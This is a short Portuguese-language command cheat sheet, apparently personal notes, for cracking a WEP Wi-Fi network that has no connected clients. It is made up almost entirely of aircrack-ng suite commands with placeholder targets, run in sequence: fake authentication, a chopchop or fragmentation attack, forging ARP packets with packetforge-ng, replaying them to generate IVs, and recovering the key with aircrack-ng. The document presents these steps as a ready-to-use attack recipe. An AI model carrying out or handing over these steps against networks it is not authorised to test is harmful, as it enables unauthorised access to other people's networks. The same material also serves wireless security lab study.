# Ataque em Redes WEP sem clientes conectados (rede OPN)

# 1) Colocar placa monitorando placa específica e gerando arquivo de saída:
airodump-ng [interface] --bssid [MAC] --channel [CH] -w arquivo.cap

# 2) Gerar autenticação falsa:
# -1: Fake auth
# : Número de pacotes para manter cliente conectado.
# -a: BSSID
# -e: SSID (nome da rede)
# -y: Especificar arquivo XOR
aireplay-ng -1 800000 -a [MAC] [interface] -e [SSID]

# 3) Manter cliente falso conectado, usar número alto de pacotes.

# 4) Ataque:
# -4: Tipo do ataque chopchop. -5: fragment
aireplay-ng -4 -a [BSSID alvo] -h [MAC fake auth] [interface]

# 5) O comando acima cria um arquivo.xor a ser utilizado para gerar IVs:
# Tipo de ataque:--arp ou -0
# -k: IP origem
# -l: IP destino (255.255.255.255 para broadcast)
packetforge-ng --arp -a [BSSID alvo] -k 255.255.255.255 -l 255.255.255.255 -h [Mac fake auth] -y [arquivo.xor] -w [arquivo_de_saída]

# 6) Enviar o pacote acima para o cliente falso (fake auth):
# Tipo: --interactive ou -2
aireplay-ng --interactive -r [arquivo_de_saída] [interface monitorando]

# 7) Atacar resultado do primeiro passo:
aircrack-ng -a 1 arquivo.pcap
